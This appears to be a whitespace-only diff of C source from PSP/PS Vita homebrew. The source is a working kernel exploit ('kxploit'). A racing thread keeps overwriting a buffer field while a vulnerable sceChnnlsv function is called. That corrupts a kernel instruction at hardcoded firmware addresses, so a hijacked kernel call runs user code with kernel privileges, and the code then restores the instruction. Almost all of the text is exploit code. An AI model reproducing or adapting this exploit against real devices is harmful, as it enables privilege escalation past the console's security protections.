@@ -44,98 +44,98 @@ u32 packet[256], is_exploited, libctime_addr=0x8800F71C;
 
 void executeKernel(u32 kernelContentFunction)
 {
-	if (_sceKernelLibcTime == NULL)
-		_sceKernelPowerLock(kernelContentFunction | (u32)0x80000000);
-	else
-		_sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
+    if (_sceKernelLibcTime == NULL)
+        _sceKernelPowerLock(kernelContentFunction | (u32)0x80000000);
+    else
+        _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
 }
 
 void repairInstruction(void){
-	//Vita 2.61
-	if (_sceKernelLibcTime == NULL)
-		_sw(0x0040F809, 0x8800CB64);
-	else
-		_sw(0x8C654384, libctime_addr); // recover the damage we've done
+    //Vita 2.61
+    if (_sceKernelLibcTime == NULL)
+        _sw(0x0040F809, 0x8800CB64);
+    else
+        _sw(0x8C654384, libctime_addr); // recover the damage we've done
 }
 
 void KernelFunction()
 {
-	is_exploited = 1;
+    is_exploited = 1;
 }
 
 int stubScanner(FunctionTable* tbl){
 
-	// thread and interrupt functions
-	PRTSTR("Scanning interrupt stubs");
-	_sceKernelCpuSuspendIntr = g_tbl->KernelCpuSuspendIntr;
-	_sceKernelCpuResumeIntr = g_tbl->KernelCpuResumeIntr;
+    // thread and interrupt functions
+    PRTSTR("Scanning interrupt stubs");
+    _sceKernelCpuSuspendIntr = g_tbl->KernelCpuSuspendIntr;
+    _sceKernelCpuResumeIntr = g_tbl->KernelCpuResumeIntr;
 
-	// vulnerable function
-	PRTSTR("Scanning vulnerable function");
-	_sceSdGetLastIndex = (void*)g_tbl->FindImportUserRam("sceChnnlsv", 0xC4C494F8);
-	if (_sceSdGetLastIndex == NULL){
-	    PRTSTR("Opening savedata utility");
-		p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
-		_sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
-		savedata_open = 1;
-	}
-	// the function we need to patch
-	_sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
+    // vulnerable function
+    PRTSTR("Scanning vulnerable function");
+    _sceSdGetLastIndex = (void*)g_tbl->FindImportUserRam("sceChnnlsv", 0xC4C494F8);
+    if (_sceSdGetLastIndex == NULL){
+        PRTSTR("Opening savedata utility");
+        p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
+        _sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
+        savedata_open = 1;
+    }
+    // the function we need to patch
+    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);
 
     PRTSTR("Scanning powerlock");
-	if (_sceKernelLibcTime == NULL)
-		_sceKernelPowerLock = (void *)g_tbl->FindImportUserRam("sceSuspendForUser", 0xEADB1BD7);
+    if (_sceKernelLibcTime == NULL)
+        _sceKernelPowerLock = (void *)g_tbl->FindImportUserRam("sceSuspendForUser", 0xEADB1BD7);
 
-	g_tbl->KernelDcacheWritebackAll();
+    g_tbl->KernelDcacheWritebackAll();
 
-	return 0;
+    return 0;
 }
 
 int doExploit()
 {
 
-	PRTSTR("Attempting kernel exploit");
+    PRTSTR("Attempting kernel exploit");
 
-	if (_IS_PSP(g_tbl->config)){
-		libctime_addr = 0x8800F798;
-		PRTSTR("Kxploit in PSP mode");
-	}
+    if (_IS_PSP(g_tbl->config)){
+        libctime_addr = 0x8800F798;
+        PRTSTR("Kxploit in PSP mode");
+    }
 
-	is_exploited = 0;
+    is_exploited = 0;
 
-	// the threads that will make sceSdGetLastIndex vulnerable
-	int qwik_thread()
-	{
-		while (is_exploited != 1) {
-			if (_sceKernelLibcTime == NULL)
-				packet[9] = 0x8800CB66 - 20 - (u32)&packet;
-			else
-				packet[9] = libctime_addr - 18 - (u32)&packet;
-			g_tbl->KernelDelayThread(0);
-		}
+    // the threads that will make sceSdGetLastIndex vulnerable
+    int qwik_thread()
+    {
+        while (is_exploited != 1) {
+            if (_sceKernelLibcTime == NULL)
+                packet[9] = 0x8800CB66 - 20 - (u32)&packet;
+            else
+                packet[9] = libctime_addr - 18 - (u32)&packet;
+            g_tbl->KernelDelayThread(0);
+        }
 
-		return 0;
-	}
+        return 0;
+    }
 
-	// we create the thread and constantly attempt the exploit
-	SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
-	g_tbl->KernelStartThread(qwikthread, 0, NULL);
+    // we create the thread and constantly attempt the exploit
+    SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
+    g_tbl->KernelStartThread(qwikthread, 0, NULL);
 
-	while (is_exploited != 1) {
-		packet[9] = (u32)16;
-		_sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
-		g_tbl->KernelDelayThread(0);
-		if (_sceKernelLibcTime == NULL)
-			_sceKernelPowerLock((u32)&KernelFunction | (u32)0x80000000);
-		else
-			_sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
-		g_tbl->KernelDcacheWritebackAll();
-	}
+    while (is_exploited != 1) {
+        packet[9] = (u32)16;
+        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
+        g_tbl->KernelDelayThread(0);
+        if (_sceKernelLibcTime == NULL)
+            _sceKernelPowerLock((u32)&KernelFunction | (u32)0x80000000);
+        else
+            _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
+        g_tbl->KernelDcacheWritebackAll();
+    }
 
-	if (savedata_open)
-		p5_close_savedata();
+    if (savedata_open)
+        p5_close_savedata();
 
-	PRTSTR("kxploit done");
+    PRTSTR("kxploit done");
 
-	return 0;
+    return 0;
 }
